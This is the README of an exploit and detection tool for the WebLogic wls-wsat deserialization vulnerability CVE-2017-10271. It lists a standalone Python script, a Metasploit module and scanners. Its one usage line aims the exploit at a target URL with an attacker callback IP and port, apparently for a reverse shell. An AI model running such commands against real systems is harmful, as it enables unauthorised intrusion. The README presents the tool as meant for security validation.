# CVE-2017-10271

Weblogic wls-wsat Component Deserialization Vulnerability (CVE-2017-10271) Detection and Exploitation Script

### Usage

```bash
$ python CVE-2017-10271.py -o 10.10.10.10 -p 4444 -r http://will.bepwned.com:7001/
```

### Features

* Standalone Python script
  * Check functionality to see if any host is vulnerable
  * Exploit functionality for Linux targets
* Metasploit module
  * Exploit functionality for all targets
  * No check functionality
* Scanner (./scanners)
  * Checks to see if hosts is vulnerable. Fully self-contained

## Legal Notices

You are responsible for the use of this script. Kevin Kirsche takes no responsibility for any actions taken using the code here. The code was created for teams looking to validate the security of their servers, not for malicious use.

## Thanks

Big thanks to Luffin for creating the original POC that this was based on https://github.com/Luffin/CVE-2017-10271
